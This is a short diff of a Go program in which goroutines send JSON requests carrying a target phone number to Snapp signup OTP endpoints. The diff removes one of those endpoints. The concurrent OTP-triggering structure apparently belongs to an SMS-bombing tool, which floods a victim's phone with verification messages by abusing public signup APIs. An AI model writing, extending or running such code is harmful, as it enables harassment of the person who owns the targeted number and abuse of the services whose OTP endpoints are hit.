@@ -231,11 +231,6 @@ func main() {
 		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=%v", phone), map[string]interface{}{
 			"cellphone": phone, // Assuming the intent was to send the phone number in the payload key "cellphone"
 		}, &wg, ch)
-		// digitalsignup.snapp.ir drivers/api/v1/otp (JSON)
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
-			"cellphone": phone,
-		}, &wg, ch)
 
 	// Goroutine to wait for all requests to complete and then close the channel.
 	go func() {
